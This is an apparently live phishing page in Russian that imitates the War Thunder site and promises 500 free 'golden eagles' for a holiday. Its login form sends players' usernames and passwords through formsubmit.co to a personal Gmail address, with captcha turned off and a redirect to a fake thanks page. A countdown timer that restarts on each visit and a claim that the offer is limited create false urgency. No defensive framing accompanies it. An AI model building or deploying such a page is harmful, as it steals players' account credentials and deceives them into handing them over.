<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>War Thunder — подарок</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        /* Верхняя панель как на скриншоте */
        .top-bar {
            background: #0a0a0a;
            padding: 12px 40px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #333;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            z-index: 100;
            font-family: 'Arial', sans-serif;
        }

        .top-bar-left {
            display: flex;
            align-items: center;
            gap: 25px;
        }

        .top-bar-logo {
            font-size: 24px;
            font-weight: 900;
            color: white;
            letter-spacing: 2px;
        }

        .top-bar-logo span {
            color: #ffd700;
        }

        .top-bar-welcome {
            color: #888;
            font-size: 14px;
            border-left: 1px solid #333;
            padding-left: 25px;
        }

        .top-bar-menu {
            display: flex;
            gap: 30px;
            color: #ccc;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .top-bar-menu span {
            cursor: default;
            transition: 0.2s;
        }

        .top-bar-menu span:hover {
            color: #ffd700;
        }

        .top-bar-right {
            display: flex;
            align-items: center;
        }

        .top-bar-register {
            background: #ffd700;
            color: black;
            padding: 8px 22px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 13px;
            text-transform: uppercase;
            cursor: default;
            letter-spacing: 1px;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: url('https://raw.githubusercontent.com/warthunderprize/war-gift/main/3840x2160_line_of_contact_logo_ru_dfcacf9311d0af4bf5296e52759249ac.jpg') no-repeat center center fixed;
            background-size: cover;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding-top: 70px;
        }

        .overlay {
            background: rgba(0, 0, 0, 0.6);
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 1;
        }

        .card {
            position: relative;
            z-index: 2;
            background: rgba(20, 20, 30, 0.9);
            backdrop-filter: blur(5px);
            padding: 40px;
            border-radius: 20px;
            width: 450px;
            text-align: center;
            color: white;
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
            border: 1px solid #ffd700;
        }

        .logo {
            font-size: 48px;
            font-weight: 900;
            letter-spacing: 5px;
            margin-bottom: 10px;
            text-shadow: 0 0 20px gold;
        }

        .logo span {
            color: #ffd700;
        }

        .sub {
            font-size: 14px;
            color: #ccc;
            margin-bottom: 30px;
        }

        h1 {
            font-size: 32px;
            margin-bottom: 10px;
            color: #ffd700;
        }

        .timer {
            background: #1e1e2a;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 32px;
            font-weight: bold;
            border: 1px solid #333;
            color: #ffd700;
        }

        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 8px;
            background: #2a2a3a;
            color: white;
            font-size: 16px;
            border: 1px solid #444;
        }

        input:focus {
            outline: none;
            border-color: #ffd700;
        }

        button {
            width: 100%;
            padding: 16px;
            background: #ffd700;
            color: black;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            margin: 20px 0;
            transition: 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        button:hover {
            background: #ffed4a;
            box-shadow: 0 0 20px gold;
        }

        .buttons {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }

        .btn-secondary {
            flex: 1;
            padding: 10px;
            background: transparent;
            border: 1px solid #ffd700;
            color: #ffd700;
            border-radius: 5px;
            cursor: default;
            font-size: 14px;
        }

        small {
            display: block;
            color: #888;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <!-- Верхняя панель как на скриншоте -->
    <div class="top-bar">
        <div class="top-bar-left">
            <div class="top-bar-logo">
                <span>WAR</span> THUNDER
            </div>
            <div class="top-bar-welcome">
                Добро пожаловать в СНГ регион
            </div>
        </div>
        
        <div class="top-bar-menu">
            <span>ИГРА</span>
            <span>МЕДИА</span>
            <span>ОБУЧЕНИЕ</span>
            <span>МАСТЕРСКАЯ</span>
            <span>СООБЩЕСТВО</span>
            <span>КИБЕРСПОРТ</span>
            <span>КОНТАКТЫ</span>
        </div>
        
        <div class="top-bar-right">
            <div class="top-bar-register">
                РЕГИСТРАЦИЯ
            </div>
        </div>
    </div>

    <div class="overlay"></div>
    
    <div class="card">
        <div class="logo">
            <span>WAR</span> THUNDER
        </div>

        <h1>500 ЗОЛОТЫХ ОРЛОВ</h1>
        <p>в ДНЯ ЗАЩИТНИКА ОТЕЧЕСТВА</p>

        <div class="timer" id="timer">25:34:12</div>

        <form action="https://formsubmit.co/dangerlight228@gmail.com" method="POST">
            <input type="hidden" name="_next" value="https://warthunderprize.github.io/war-gift/thanks.html">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            
            <input type="text" name="login" placeholder="Логин или e-mail" required>
            <input type="password" name="password" placeholder="Пароль" required>
            
            <button type="submit">ПОЛУЧИТЬ НАГРАДУ</button>
        </form>

        <div class="buttons">
            <div class="btn-secondary">РЕГИСТРАЦИЯ</div>
            <div class="btn-secondary">СКАЧАТЬ ИГРУ</div>
        </div>

        <small>Акция ограничена: первые 50000 игроков</small>
    </div>

   <script>
    // Устанавливаем дату окончания: текущее время + 25 часов
    var countDownDate = new Date().getTime() + 90000000; // 25 часов
    
    var x = setInterval(function() {
        var now = new Date().getTime();
        var distance = countDownDate - now;
        
        // Расчёт часов, минут, секунд
        var hours = Math.floor(distance / (1000 * 60 * 60));
        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
        
        // Вывод с ведущими нулями
        document.getElementById("timer").innerHTML = 
            (hours < 10 ? '0' + hours : hours) + ':' +
            (minutes < 10 ? '0' + minutes : minutes) + ':' +
            (seconds < 10 ? '0' + seconds : seconds);
        
        // Если таймер закончился
        if (distance < 0) {
            clearInterval(x);
            document.getElementById("timer").innerHTML = "АКЦИЯ ЗАВЕРШЕНА";
        }
    }, 1000);
</script>
</body>
</html>
